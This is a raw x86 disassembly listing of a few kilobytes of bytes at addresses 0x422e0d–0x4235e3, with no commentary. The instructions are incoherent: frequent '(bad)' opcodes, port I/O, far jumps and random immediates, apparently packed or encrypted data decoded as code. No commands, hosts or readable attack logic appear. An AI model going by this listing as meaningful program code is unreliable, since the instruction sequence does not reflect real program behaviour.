  422e0d:	es jmp 0x422e5c
  422e10:	aaa    
  422e11:	pop    ss
  422e12:	cmp    edi,DWORD PTR [ebx-0x2]
  422e15:	push   ebp
  422e16:	sub    BYTE PTR cs:[esi],al
  422e19:	xchg   DWORD PTR [edi],eax
  422e1b:	aas    
  422e1c:	pop    eax
  422e1d:	retf   
  422e1e:	pop    ss
  422e1f:	hlt    
  422e20:	jae    0x422e7c
  422e22:	(bad)  [edx]
  422e24:	lock jp 0x422e10
  422e27:	cmp    eax,DWORD PTR [eax]
  422e29:	mov    bl,0xc1
  422e2b:	ins    DWORD PTR es:[edi],dx
  422e2c:	lock scas eax,DWORD PTR es:[edi]
  422e2e:	ins    BYTE PTR es:[edi],dx
  422e2f:	mov    bh,0x1c
  422e31:	dec    esi
  422e32:	pop    edi
  422e33:	add    DWORD PTR [esi+0x63],eax
  422e36:	xor    bl,0x6
  422e39:	nop
  422e3a:	xchg   esi,eax
  422e3b:	jbe    0x422df2
  422e3d:	(bad)  
  422e3e:	push   ebx
  422e3f:	xchg   BYTE PTR [ebx+0x5fc2213f],cl
  422e45:	retf   0xccf7
  422e48:	adc    eax,0x9eb5edac
  422e4d:	and    eax,0x3380
	...
  422e5a:	stc    
  422e5b:	std    
  422e5c:	in     eax,dx
  422e5d:	mov    cl,0xed
  422e5f:	mov    cl,0xfd
  422e61:	std    
  422e62:	cmp    bl,BYTE PTR [edi+0x735ffec4]
  422e68:	imul   ebx,DWORD PTR [edx+0x1a8e2],0xfffffffe
  422e6f:	add    DWORD PTR [eax],eax
  422e71:	add    BYTE PTR [ecx+0x368f835c],bl
  422e77:	dec    esi
  422e78:	popa   
  422e79:	sbb    al,0x95
  422e7b:	cmp    ah,cl
  422e7d:	push   ds
  422e7e:	push   ebp
  422e7f:	xchg   esp,eax
  422e80:	cmp    ebp,DWORD PTR [esi+0x171de4a]
  422e86:	cmp    edx,DWORD PTR [ecx-0x49]
  422e89:	or     ebx,DWORD PTR [esi-0x3dca5891]
  422e8f:	(bad)  
  422e90:	pop    edi
  422e91:	jbe    0x422eb7
  422e93:	pop    edi
  422e94:	fcomp  QWORD PTR fs:0xba6af4e8
  422e9b:	out    dx,al
  422e9c:	retf   
  422e9d:	pop    ds
  422e9e:	clc    
  422e9f:	push   es
  422ea0:	inc    esp
  422ea1:	dec    ecx
  422ea2:	out    0x76,eax
  422ea4:	mov    ?,WORD PTR [ebp-0x41]
  422ea7:	mov    bl,ah
  422ea9:	or     dh,bl
  422eab:	(bad)  
  422eac:	call   0x2dd9:0x49e2975a
  422eb3:	mov    es,WORD PTR ds:0x579559dc
  422eb9:	adc    DWORD PTR [ebp+0x20fa7e52],0x903d4655
  422ec3:	cwde   
  422ec4:	outs   dx,DWORD PTR ds:[esi]
  422ec5:	sub    BYTE PTR [ebp-0x14],ah
  422ec8:	mov    ch,0xe4
  422eca:	xchg   ecx,eax
  422ecb:	inc    edi
  422ecc:	int3   
  422ecd:	jecxz  0x422e6a
  422ecf:	jmp    0xe33d:0xccc998b
  422ed6:	aaa    
  422ed7:	jne    0x422ee4
  422ed9:	mov    dl,0xae
  422edb:	jns    0x422ea4
  422edd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422ede:	in     eax,0xb8
  422ee0:	adc    ebx,ecx
  422ee2:	fstp   DWORD PTR [ecx-0x5]
  422ee5:	rcl    bl,0x5c
  422ee8:	ds daa 
  422eea:	into   
  422eeb:	inc    ecx
  422eec:	mov    eax,0xa42d4b5a
  422ef1:	sub    bh,BYTE PTR [ebx-0x1d]
  422ef4:	xchg   BYTE PTR [edi],cl
  422ef6:	push   ds
  422ef7:	mov    eax,ds:0xe0878ad8
  422efc:	push   eax
  422efd:	in     al,0xfa
  422eff:	xchg   edi,eax
  422f00:	test   DWORD PTR [ebx],ebp
  422f02:	in     eax,0x81
  422f04:	xor    BYTE PTR fs:[edx+0x16],0xb1
  422f09:	cmp    edi,DWORD PTR [ecx+0x70]
  422f0c:	dec    ebx
  422f0d:	add    ecx,esp
  422f0f:	ja     0x422ed6
  422f11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f12:	add    al,0x79
  422f14:	nop
  422f15:	xchg   esp,eax
  422f16:	add    edi,DWORD PTR [edi]
  422f18:	mov    dh,0xbf
  422f1a:	pop    edx
  422f1b:	sbb    ecx,DWORD PTR [esp+edx*2]
  422f1e:	in     eax,0xcc
  422f20:	sbb    al,0x62
  422f22:	mov    BYTE PTR [ecx],bh
  422f24:	scas   al,BYTE PTR es:[edi]
  422f25:	repnz pop esp
  422f27:	push   es
  422f28:	dec    edi
  422f29:	pop    es
  422f2a:	adc    al,0x56
  422f2c:	loope  0x422f93
  422f2e:	test   al,0x2
  422f30:	call   0xcd6a6b30
  422f35:	fsub   QWORD PTR [esi]
  422f37:	ds jo  0x422f37
  422f3a:	lahf   
  422f3b:	test   BYTE PTR [eax-0x6220e6f8],0x12
  422f42:	daa    
  422f43:	inc    eax
  422f44:	imul   BYTE PTR [eax-0x18]
  422f47:	inc    esp
  422f48:	mov    ds:0x9add6247,eax
  422f4d:	mov    al,0x1
  422f4f:	mov    ebx,0xf5e3262f
  422f54:	test   DWORD PTR [ebp+0x1],0xe8f3f4a
  422f5b:	into   
  422f5c:	push   esp
  422f5d:	retf   
  422f5e:	or     eax,0x6e5e17f7
  422f63:	fwait
  422f64:	js     0x422f2b
  422f66:	pop    edx
  422f67:	loopne 0x422f17
  422f69:	fwait
  422f6a:	pop    ss
  422f6b:	shr    DWORD PTR [ebp+eax*1+0x515dbd47],1
  422f72:	imul   ebp,DWORD PTR [edx+ebx*2+0x33],0xffffff82
  422f77:	fistp  WORD PTR [ebx+0x2c]
  422f7a:	jp     0x422f1a
  422f7c:	jmp    0xe5c70538
  422f81:	and    eax,0xb5e10499
  422f86:	aas    
  422f87:	sbb    eax,0x212c3183
  422f8c:	push   esi
  422f8d:	adc    BYTE PTR [esi+0x23c6ef79],dh
  422f93:	aaa    
  422f94:	xchg   ecx,eax
  422f95:	das    
  422f96:	fcmovbe st,st(6)
  422f98:	xor    BYTE PTR [edi+0x3f099ecd],bl
  422f9e:	call   0x8dc2:0x50992210
  422fa5:	jnp    0x423017
  422fa7:	and    DWORD PTR [edi],0x8a410f03
  422fad:	iret   
  422fae:	lea    eax,[edi+0x73]
  422fb1:	inc    esp
  422fb2:	or     DWORD PTR [ecx+eiz*2+0x74],eax
  422fb6:	cmp    DWORD PTR [ebx+edx*4+0x7c],edx
  422fba:	or     cl,BYTE PTR [ebp-0x4eef2a64]
  422fc0:	ja     0x423005
  422fc2:	cmp    ah,BYTE PTR [edi+0x28d1ce76]
  422fc8:	out    0x27,eax
  422fca:	das    
  422fcb:	dec    edi
  422fcc:	mov    esi,0x76e9b088
  422fd1:	pop    ebx
  422fd2:	adc    al,0x10
  422fd4:	shr    edx,cl
  422fd6:	jle    0x422fb6
  422fd8:	cld    
  422fd9:	sub    eax,0x323db0d8
  422fde:	daa    
  422fdf:	int3   
  422fe0:	ss jae 0x422fb1
  422fe3:	pop    eax
  422fe4:	out    0x3f,al
  422fe6:	into   
  422fe7:	fcmovb st,st(7)
  422fe9:	xchg   edx,eax
  422fea:	jmp    0x422fe3
  422fec:	shr    DWORD PTR ds:0x5381481c,1
  422ff2:	shl    BYTE PTR [ecx+0x207ddb9b],cl
  422ff8:	sar    ch,1
  422ffa:	pop    ds
  422ffb:	clc    
  422ffc:	lea    edx,[ecx-0x18]
  422fff:	push   cs
  423000:	sbb    al,BYTE PTR [esi+ebx*1]
  423003:	jmp    0xd1a8eb82
  423008:	call   0x235d:0x3b0e3edf
  42300f:	in     eax,0x7b
  423011:	ja     0x422fa6
  423013:	cmp    esi,eax
  423015:	sbb    ecx,0x2d
  423018:	mov    eax,0x2abc19be
  42301d:	popf   
  42301e:	mul    BYTE PTR [edx]
  423020:	mov    edx,0x139a0143
  423025:	lahf   
  423026:	mov    al,ds:0x3e50406a
  42302b:	jb     0x423042
  42302d:	mov    bh,0xee
  42302f:	aaa    
  423030:	out    dx,al
  423031:	push   esi
  423032:	xor    BYTE PTR [ebx],al
  423034:	add    BYTE PTR [esi+0x3c],cl
  423037:	mov    cl,0xba
  423039:	cwde   
  42303a:	adc    eax,0x15011ef1
  42303f:	loope  0x42308c
  423041:	mov    esp,DWORD PTR ds:0x228f91a2
  423047:	mov    bh,0xc6
  423049:	and    eax,0xf22de5a5
  42304e:	xor    DWORD PTR [ebx+eiz*2+0x51],ecx
  423052:	ficomp DWORD PTR [eax+edi*1-0x737f4130]
  423059:	sbb    cl,BYTE PTR [edi+eiz*8+0x6a]
  42305d:	test   bh,0x8
  423060:	shl    BYTE PTR [ecx+0x6cf2075],1
  423066:	jg     0x423099
  423068:	push   esi
  423069:	pop    es
  42306a:	fstp   QWORD PTR [ebx+0x79]
  42306d:	addr16 push ebp
  42306f:	jecxz  0x423071
	...
  423079:	add    dl,dh
  42307b:	rol    BYTE PTR ds:0xf6d53751,0xe3
  423082:	test   BYTE PTR [eax],0xec
  423085:	inc    esi
  423086:	sbb    esp,esi
  423088:	add    al,0x99
  42308a:	loopne 0x423036
  42308c:	add    DWORD PTR [eax],eax
  42308e:	inc    BYTE PTR [ecx]
  423090:	add    BYTE PTR [eax],al
  423092:	mov    cl,0x4d
  423094:	sub    al,BYTE PTR [ecx-0x62]
  423097:	ins    DWORD PTR es:[edi],dx
  423098:	(bad)  
  423099:	(bad)  
  42309a:	mov    ah,0xa0
  42309c:	xlat   BYTE PTR ds:[ebx]
  42309d:	sbb    DWORD PTR [esi-0x23],esi
  4230a0:	aam    0xd9
  4230a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4230a3:	pop    es
  4230a4:	cmp    eax,0xb0a91db1
  4230a9:	xor    BYTE PTR [edi],0x60
  4230ac:	lahf   
  4230ad:	inc    esi
  4230ae:	fwait
  4230af:	xchg   ecx,eax
  4230b0:	jle    0x423040
  4230b2:	adc    esp,edi
  4230b4:	lock div BYTE PTR [edi+edi*2]
  4230b8:	push   esp
  4230b9:	shl    bh,0xd9
  4230bc:	mov    BYTE PTR [edx],dl
  4230be:	loopne 0x4230d7
  4230c0:	lahf   
  4230c1:	ret    0x3518
  4230c4:	inc    ecx
  4230c5:	mov    eax,ds:0xf60265bb
  4230ca:	jecxz  0x4230a6
  4230cc:	jne    0x4230f4
  4230ce:	xchg   esp,eax
  4230cf:	fninit 
  4230d1:	inc    ebp
  4230d2:	push   edx
  4230d3:	jecxz  0x42306d
  4230d5:	pusha  
  4230d6:	jbe    0x4230ab
  4230d8:	xchg   DWORD PTR [ebp*4+0x35f9a698],esp
  4230df:	add    cl,BYTE PTR [ebp-0x42]
  4230e2:	(bad)  
  4230e4:	sbb    edx,0x98d8f620
  4230ea:	and    BYTE PTR [esi+0x7e],al
  4230ed:	cmp    al,0x81
  4230ef:	arpl   dx,si
  4230f1:	in     eax,dx
  4230f2:	lods   eax,DWORD PTR ds:[esi]
  4230f3:	sbb    ebx,DWORD PTR [esi+ebp*1-0x1]
  4230f7:	jne    0x423147
  4230f9:	adc    DWORD PTR [esp+edx*4+0x35],ecx
  4230fd:	inc    esi
  4230fe:	sahf   
  4230ff:	mov    eax,0x84d78613
  423104:	push   es
  423105:	loope  0x42309a
  423107:	add    BYTE PTR [ebx-0x747bcd72],ah
  42310d:	push   ds
  42310e:	dec    DWORD PTR [edi]
  423110:	push   esp
  423111:	or     eax,0xc05ad290
  423116:	xchg   ecx,eax
  423117:	cwde   
  423118:	mov    ecx,0x9be53ee8
  42311d:	or     BYTE PTR [eax+0x78],ch
  423120:	hlt    
  423121:	neg    DWORD PTR [edi+0x5]
  423124:	retf   0xc38e
  423127:	mov    ecx,0xf8e53497
  42312c:	xchg   ebp,eax
  42312d:	xor    DWORD PTR [edx-0x17],ebx
  423130:	out    dx,eax
  423131:	sbb    esp,DWORD PTR [ebp-0x751174a7]
  423137:	cdq    
  423138:	sub    esp,edi
  42313a:	mov    eax,0x4c8dbce1
  42313f:	mov    ecx,DWORD PTR [edx+ecx*1-0x7db5f609]
  423146:	xor    al,0xd6
  423148:	sbb    dh,BYTE PTR [ebp+0xe]
  42314b:	push   esi
  42314c:	xchg   ebp,eax
  42314d:	and    esp,DWORD PTR [ecx+edi*8-0x3fa61830]
  423154:	lods   al,BYTE PTR ds:[esi]
  423155:	shl    DWORD PTR ds:0x4b9e992a,0x4a
  42315c:	mov    ch,0xe9
  42315e:	mov    cl,0xcf
  423160:	push   ss
  423161:	(bad)  
  423162:	pop    ecx
  423163:	jmp    0x423186
  423165:	xchg   edi,eax
  423166:	xor    eax,0x1f2b6849
  42316b:	lds    ecx,FWORD PTR ds:0xd413154b
  423171:	jns    0x4231a6
  423173:	or     edx,ecx
  423175:	fbstp  TBYTE PTR [ebp-0x5c]
  423178:	jo     0x4231ac
  42317a:	jmp    FWORD PTR [edx+0x19544592]
  423180:	pushf  
  423181:	adc    DWORD PTR [ebp-0x79],0xffffffc9
  423185:	ret    
  423186:	xor    eax,0xd380d221
  42318b:	ror    DWORD PTR [ecx+edx*1+0x1355b619],cl
  423192:	jge    0x42316f
  423194:	ret    
  423195:	les    edx,FWORD PTR [ebx-0x23]
  423198:	setg   BYTE PTR [esi-0x2f189d9e]
  42319f:	fidiv  DWORD PTR [esi+0x60]
  4231a2:	xchg   ecx,eax
  4231a3:	sub    BYTE PTR [eax],bl
  4231a5:	enter  0xec80,0x4
  4231a9:	test   DWORD PTR [esi+0x4ad07e85],ebp
  4231af:	lahf   
  4231b0:	enter  0x357e,0x20
  4231b4:	mov    bl,0x2f
  4231b6:	push   edi
  4231b7:	jl     0x423182
  4231b9:	xchg   ebx,eax
  4231ba:	aaa    
  4231bb:	sbb    dl,al
  4231bd:	pop    ebx
  4231be:	inc    edi
  4231bf:	sbb    al,0x69
  4231c1:	mov    bl,0x2f
  4231c3:	loopne 0x423175
  4231c5:	leave  
  4231c6:	in     al,dx
  4231c7:	cmp    esi,ebx
  4231c9:	xchg   edx,eax
  4231ca:	xor    al,0x61
  4231cc:	lds    edx,FWORD PTR [ebx+0x74]
  4231cf:	int    0x50
  4231d1:	jbe    0x423249
  4231d3:	(bad)
  4231d7:	and    al,0xf6
  4231d9:	inc    esi
  4231da:	leave  
  4231db:	call   FWORD PTR [ecx+0x9]
  4231de:	fs jge 0x42325e
  4231e1:	sbb    ah,cl
  4231e3:	fdiv   QWORD PTR [edi-0x12a45d49]
  4231e9:	pop    esi
  4231ea:	in     al,dx
  4231eb:	in     al,0x2b
  4231ed:	(bad)  
  4231ee:	xor    al,ah
  4231f0:	fwait
  4231f1:	int3   
  4231f2:	gs mov bl,0x52
  4231f5:	jl     0x423260
  4231f7:	mov    dh,0x75
  4231f9:	mov    eax,0x564fc3de
  4231fe:	outs   dx,DWORD PTR ds:[esi]
  4231ff:	push   edi
  423200:	inc    eax
  423201:	pop    esp
  423202:	xchg   ah,dh
  423204:	adc    edx,DWORD PTR [edi-0x28]
  423207:	dec    ecx
  423208:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423209:	mov    eax,0x2cf0a512
  42320e:	repnz sbb ch,al
  423211:	out    0xef,al
  423213:	add    DWORD PTR [esi],edi
  423215:	fidiv  WORD PTR [edi+0x58]
  423218:	(bad)  
  423219:	mov    es,WORD PTR [edx+esi*1]
  42321c:	pop    esi
  42321d:	and    eax,0xca42539e
  423222:	xchg   edx,eax
  423223:	lds    edi,FWORD PTR [ecx-0x36a190fa]
  423229:	mov    dh,0xb9
  42322b:	xor    BYTE PTR [esi],al
  42322d:	test   BYTE PTR [ebx-0x1d8dd9d0],bh
  423233:	inc    edi
  423234:	or     ah,BYTE PTR [ebx]
  423236:	daa    
  423237:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423238:	sbb    al,0x79
  42323a:	imul   eax,DWORD PTR [ebp+eiz*2-0x3c],0xe3bf64b7
  423242:	mov    esi,0x78aa9b5f
  423247:	dec    ecx
  423248:	aam    0x8f
  42324a:	nop
  42324b:	mov    edi,0x8fb5dfc4
  423250:	xchg   esp,eax
  423251:	call   0xcffebdaf
  423256:	xor    bl,0xf
  423259:	pop    ecx
  42325a:	test   eax,0xef09a45d
  42325f:	pop    ebp
  423260:	cmp    ebp,esi
  423262:	pop    ebp
  423263:	lds    eax,FWORD PTR [esi+0x66]
  423266:	and    BYTE PTR ss:[eax-0xdfde9be],bh
  42326d:	xchg   ecx,eax
  42326e:	adc    eax,0xef2e60ac
  423273:	jp     0x42326d
  423275:	push   es
  423276:	mov    BYTE PTR [ecx-0xc7d66d1],cl
  42327c:	xchg   edx,eax
  42327d:	sbb    esp,DWORD PTR [ecx+0x3541a39b]
  423283:	or     al,0xc5
  423285:	and    al,0x61
  423287:	mov    edx,0xdfe73500
  42328c:	arpl   WORD PTR [eax+0xe798],bx
	...
  42329a:	inc    ebx
  42329b:	inc    ecx
  42329c:	popa   
  42329d:	data16 arpl WORD PTR [esi+0x47],sp
  4232a1:	gs push cs
  4232a3:	mov    BYTE PTR [edi-0x37],bh
  4232a6:	js     0x42324d
  4232a8:	jecxz  0x4232d5
  4232aa:	fisubr WORD PTR [ecx+eax*1+0x1fe00]
  4232b1:	add    BYTE PTR [ebp+0x7f23ac57],cl
  4232b7:	popa   
  4232b8:	inc    esp
  4232b9:	push   es
  4232ba:	leave  
  4232bb:	iret   
  4232bc:	nop
  4232bd:	retf   0x5879
  4232c0:	inc    ebp
  4232c1:	fdivp  st(6),st
  4232c3:	call   0xcb3d6c58
  4232c8:	ret    0xb7f2
  4232cb:	pop    es
  4232cc:	retf   
  4232cd:	adc    BYTE PTR [ecx-0x74ff3ccb],dl
  4232d3:	inc    esi
  4232d4:	inc    eax
  4232d5:	pop    eax
  4232d6:	test   DWORD PTR [ebp-0x3b],0x32f374a1
  4232dd:	cmp    ebp,DWORD PTR [eax+0x5d]
  4232e0:	idiv   ecx
  4232e2:	cmp    al,0x68
  4232e4:	mov    bl,0x63
  4232e6:	push   edx
  4232e7:	shl    DWORD PTR [edi+ebx*1-0x56],cl
  4232eb:	jmp    0x423308
  4232ed:	(bad)
  4232f0:	sbb    eax,0xd3583b43
  4232f5:	mov    dh,BYTE PTR [ebp+0x50]
  4232f8:	repz jmp 0x9fca41f3
  4232fe:	fwait
  4232ff:	mov    al,0x5f
  423301:	jb     0x423359
  423303:	icebp  
  423304:	fmul   st,st(6)
  423306:	cmp    eax,0x5779683f
  42330b:	add    ebp,DWORD PTR [ebp-0x30824928]
  423311:	fisub  DWORD PTR [ebp-0x3708a2f0]
  423317:	inc    edi
  423318:	ret    0x825f
  42331b:	data16 (bad) 
  42331d:	jecxz  0x4232b5
  42331f:	int3   
  423320:	lods   al,BYTE PTR ds:[esi]
  423321:	inc    ebx
  423322:	rcl    ebx,cl
  423324:	adc    eax,0xcdb2044e
  423329:	outs   dx,BYTE PTR ds:[esi]
  42332a:	push   esi
  42332b:	aad    0x66
  42332d:	mov    esp,DWORD PTR [eax-0x730fbc88]
  423333:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423334:	inc    ecx
  423335:	mov    edi,0xae672473
  42333a:	push   ds
  42333b:	cmc    
  42333c:	mov    dh,0x98
  42333e:	add    dl,bl
  423340:	dec    esi
  423341:	push   edi
  423342:	sub    dl,bh
  423344:	lods   eax,DWORD PTR ds:[esi]
  423345:	cs out 0x1f,al
  423348:	jle    0x4232fc
  42334a:	scas   eax,DWORD PTR es:[edi]
  42334b:	imul   edx,DWORD PTR [edx-0x2a],0xfffffff6
  42334f:	ss jb  0x423381
  423352:	xchg   BYTE PTR [edi],ch
  423354:	stos   DWORD PTR es:[edi],eax
  423355:	stc    
  423356:	lds    eax,FWORD PTR [edx]
  423358:	cs mov dl,0x54
  42335b:	push   ds
  42335c:	cmp    dh,BYTE PTR [esp+edi*8]
  42335f:	and    DWORD PTR [edx],eax
  423361:	xor    al,ah
  423363:	xchg   esp,eax
  423364:	inc    eax
  423365:	sar    cl,0x41
  423368:	adc    DWORD PTR [edx+0x42],esi
  42336b:	std    
  42336c:	loopne 0x42333a
  42336e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42336f:	bound  edi,QWORD PTR [ecx+0x1b]
  423372:	test   al,0x35
  423374:	cli    
  423375:	ins    BYTE PTR es:[edi],dx
  423376:	xor    BYTE PTR [ebp-0x4cfef2db],bh
  42337c:	push   ss
  42337d:	cmp    BYTE PTR [ecx],ah
  42337f:	pop    ebp
  423380:	out    0x1b,al
  423382:	pop    esi
  423383:	push   0xfffffff0
  423385:	or     ebx,edx
  423387:	xchg   edx,eax
  423388:	(bad)
  42338d:	dec    edx
  42338e:	pop    edx
  42338f:	add    al,0x95
  423391:	mov    esp,0xc2f61cb0
  423396:	popa   
  423397:	mov    ecx,0x82f5c0e6
  42339c:	dec    edi
  42339d:	pop    edx
  42339e:	(bad)  
  4233a0:	sbb    al,BYTE PTR [esi-0x7c]
  4233a3:	int3   
  4233a4:	cmp    eax,0x596597bc
  4233a9:	stos   BYTE PTR es:[edi],al
  4233aa:	cs aam 0x57
  4233ad:	sbb    DWORD PTR [edx],ecx
  4233af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4233b0:	mov    dh,0xe2
  4233b2:	add    ebx,DWORD PTR [ebp-0x41]
  4233b5:	mov    dl,0x12
  4233b7:	loope  0x4233ea
  4233b9:	pop    eax
  4233ba:	inc    ecx
  4233bb:	dec    esi
  4233bc:	and    al,0xa2
  4233be:	fxam   
  4233c0:	inc    ecx
  4233c1:	lods   eax,DWORD PTR fs:[esi]
  4233c3:	mov    ds:0x3eee2136,al
  4233c8:	jb     0x42335d
  4233ca:	pop    edi
  4233cb:	xchg   bh,dh
  4233cd:	ret    0xc29e
  4233d0:	mov    dh,0x34
  4233d2:	call   0x1028320a
  4233d7:	addr16 (bad) 
  4233d9:	retf   0x1d34
  4233dc:	loopne 0x4233e4
  4233de:	ins    DWORD PTR es:[edi],dx
  4233df:	add    eax,0x2712bf6e
  4233e4:	add    BYTE PTR [eax+0x7793690d],bl
  4233ea:	mov    dl,0x5d
  4233ec:	(bad)  
  4233ed:	loopne 0x42344a
  4233ef:	mov    eax,ds:0x3b7d491b
  4233f4:	shl    DWORD PTR [eax+0x4551a893],cl
  4233fa:	aas    
  4233fb:	cmp    ah,BYTE PTR [eax]
  4233fd:	je     0x423381
  4233ff:	faddp  st(5),st
  423401:	sbb    al,0xd4
  423403:	xor    BYTE PTR [ecx-0x7b],dl
  423406:	lahf   
  423407:	xlat   BYTE PTR ds:[ebx]
  423408:	iret   
  423409:	fcomip st,st(7)
  42340b:	mov    al,ds:0x67c8ac9c
  423410:	loope  0x423448
  423412:	add    cl,bl
  423414:	and    DWORD PTR [ebx+0x26],ebp
  423417:	mov    ch,0xee
  423419:	rcl    DWORD PTR [ebx],0x8b
  42341c:	(bad)  
  42341d:	bswap  esp
  42341f:	sbb    al,0x1d
  423421:	(bad)  
  423422:	das    
  423423:	or     ah,ch
  423425:	and    edi,DWORD PTR [ebx+0x6d]
  423428:	neg    esp
  42342a:	out    0x65,eax
  42342c:	cld    
  42342d:	xchg   ebp,eax
  42342e:	mov    ds:0x45452df5,eax
  423433:	lahf   
  423434:	sub    BYTE PTR [ebp+edx*4+0x11],dh
  423438:	mov    DWORD PTR [edi-0x19786d67],edi
  42343e:	aad    0xe8
  423440:	sahf   
  423441:	imul   edi,DWORD PTR [ebx+0x72181d6c],0x243c7980
  42344b:	cmp    DWORD PTR [esp-0x6bcf68f5],0xffffffe5
  423453:	push   ebx
  423454:	mov    eax,ds:0x9b674c06
  423459:	(bad)  
  42345a:	fucomi st,st(7)
  42345c:	iret   
  42345d:	adc    BYTE PTR [ebx+0x3c53a368],dl
  423463:	xchg   ah,ah
  423465:	lds    edi,FWORD PTR ds:[ecx]
  423468:	inc    esp
  423469:	add    esi,edx
  42346b:	emms   
  42346d:	cdq    
  42346e:	adc    eax,DWORD PTR [esi-0x2d]
  423471:	push   ecx
  423472:	xchg   si,ax
  423474:	mov    ds:0x6a939e96,al
  423479:	retf   
  42347a:	loop   0x423435
  42347c:	sbb    al,0xf9
  42347e:	in     eax,dx
  42347f:	call   0xd43671cc
  423484:	xor    BYTE PTR [edx],bl
  423486:	xchg   ebx,eax
  423487:	inc    ecx
  423488:	pop    es
  423489:	lds    eax,FWORD PTR [edx+edi*8-0x2c]
  42348d:	aas    
  42348e:	mov    al,0xf2
  423490:	(bad)  
  423491:	stos   DWORD PTR es:[edi],eax
  423492:	fpatan 
  423494:	or     ch,al
  423496:	cmp    eax,0x7c483103
  42349b:	stc    
  42349c:	push   esp
  42349d:	in     eax,0x5f
  42349f:	xor    ch,BYTE PTR [ecx+esi*1]
  4234a2:	dec    ecx
  4234a3:	aad    0x9
  4234a5:	(bad)  
  4234a6:	sti    
  4234a7:	push   cs
  4234a8:	or     eax,0x9d70bbd
  4234ad:	add    DWORD PTR [ecx+0xd8],ebp
  4234b3:	add    BYTE PTR [eax],al
  4234b5:	add    BYTE PTR [eax],al
  4234b7:	add    BYTE PTR [eax],al
  4234b9:	add    BYTE PTR [ebx-0xce42c16],cl
  4234bf:	cmp    ecx,ebx
  4234c1:	cli    
  4234c2:	cmp    dh,bl
  4234c4:	adc    BYTE PTR [ebx],dl
  4234c6:	mov    al,0x4f
  4234c8:	mov    ah,BYTE PTR [ecx-0x24]
  4234cb:	scas   al,BYTE PTR es:[edi]
  4234cc:	add    DWORD PTR [eax],eax
  4234ce:	inc    BYTE PTR [ecx]
  4234d0:	add    BYTE PTR [eax],al
  4234d2:	outs   dx,BYTE PTR ds:[esi]
  4234d3:	(bad)  
  4234d5:	leave  
  4234d6:	std    
  4234d7:	test   al,0x46
  4234d9:	ins    DWORD PTR es:[edi],dx
  4234da:	pop    ecx
  4234db:	sub    eax,0x22667dfd
  4234e0:	cli    
  4234e1:	xchg   ebp,eax
  4234e2:	adc    esi,ebx
  4234e4:	dec    esi
  4234e5:	enter  0x71f5,0x3b
  4234e9:	jl     0x423528
  4234eb:	cs rcr eax,cl
  4234ee:	lahf   
  4234ef:	sbb    BYTE PTR [ebx+0x6af8fe34],dl
  4234f5:	mov    al,0xf7
  4234f7:	leave  
  4234f8:	or     DWORD PTR ds:0x6a05cbef,ebp
  4234fe:	or     dl,ch
  423500:	dec    esi
  423501:	ret    0x9886
  423504:	(bad)  
  423506:	mov    cl,dl
  423508:	xor    BYTE PTR [eax+ecx*2+0x79c66b2a],dl
  42350f:	adc    DWORD PTR [eax+0x5bba387d],esi
  423515:	sub    esp,DWORD PTR [edi-0x7a]
  423518:	popa   
  423519:	push   0xfffffffd
  42351b:	jmp    0x423570
  42351d:	pop    edi
  42351e:	adc    ebp,edx
  423520:	fmul   QWORD PTR [ebx-0x24]
  423523:	retf   0x3166
  423526:	mov    esi,0xc913c6cb
  42352b:	push   eax
  42352c:	xor    al,0x53
  42352e:	xchg   DWORD PTR [ecx+ecx*4],ecx
  423531:	(bad)  
  423532:	mov    al,ds:0xed5068df
  423537:	mov    edi,0xde39de9e
  42353c:	fdiv   DWORD PTR [eax+0x3439200b]
  423542:	inc    ecx
  423543:	in     al,dx
  423544:	dec    eax
  423545:	loop   0x4234df
  423547:	pop    ebp
  423548:	adc    DWORD PTR [ebx-0x7],esi
  42354b:	gs ret 
  42354d:	lock les esi,FWORD PTR [ebx+0x4e]
  423551:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423552:	xchg   esp,eax
  423553:	push   edi
  423554:	inc    ecx
  423555:	dec    esi
  423556:	add    eax,0x5be3ad1d
  42355b:	fidivr WORD PTR [esi+0x5ef211]
  423561:	adc    al,0x35
  423563:	inc    esi
  423564:	push   esp
  423565:	mov    esp,0x443c862d
  42356a:	lds    esp,FWORD PTR [ecx-0x6d]
  42356d:	xor    eax,0xe4358c92
  423572:	and    edx,edi
  423574:	sbb    al,0xf1
  423576:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423577:	push   cs
  423578:	sub    DWORD PTR ds:0xc071b02d,esi
  42357e:	inc    edx
  42357f:	cmp    eax,0xed0669ed
  423584:	or     al,0xc5
  423586:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423587:	pop    ebp
  423588:	jg     0x4235b5
  42358a:	inc    edi
  42358b:	push   ebx
  42358c:	or     eax,0x2711092
  423591:	mov    bh,0x2d
  423593:	xor    dh,cl
  423595:	inc    ecx
  423596:	mov    ds:0xf3e729e6,eax
  42359b:	js     0x42358d
  42359d:	fwait
  42359e:	mov    ecx,ds
  4235a0:	mov    esi,0x830f7d78
  4235a5:	inc    ebp
  4235a6:	ds jge 0x423579
  4235a9:	jo     0x4235bd
  4235ab:	push   esp
  4235ac:	aas    
  4235ad:	daa    
  4235ae:	aad    0x6
  4235b0:	cmc    
  4235b1:	pop    eax
  4235b2:	ins    BYTE PTR es:[edi],dx
  4235b3:	(bad)  
  4235b4:	mov    al,ds:0x7ed89db9
  4235b9:	sar    BYTE PTR [ebx-0x27],cl
  4235bc:	jmp    0x423592
  4235be:	or     BYTE PTR [ecx-0x51],cl
  4235c1:	xor    bl,BYTE PTR [ecx]
  4235c3:	dec    ebp
  4235c4:	(bad)  
  4235c5:	mov    eax,ds:0x1c137992
  4235ca:	aad    0xb6
  4235cc:	xor    BYTE PTR [eax],cl
  4235ce:	aaa    
  4235cf:	loop   0x423611
  4235d1:	sahf   
  4235d2:	add    bl,BYTE PTR [ecx-0x73]
  4235d5:	(bad)  [edx+0x2d0d01c5]
  4235db:	(bad)
  4235de:	adc    al,0x68
  4235e0:	aas    
  4235e1:	xchg   ebx,eax
  4235e2:	in     al,dx
  4235e3:	push   ebx
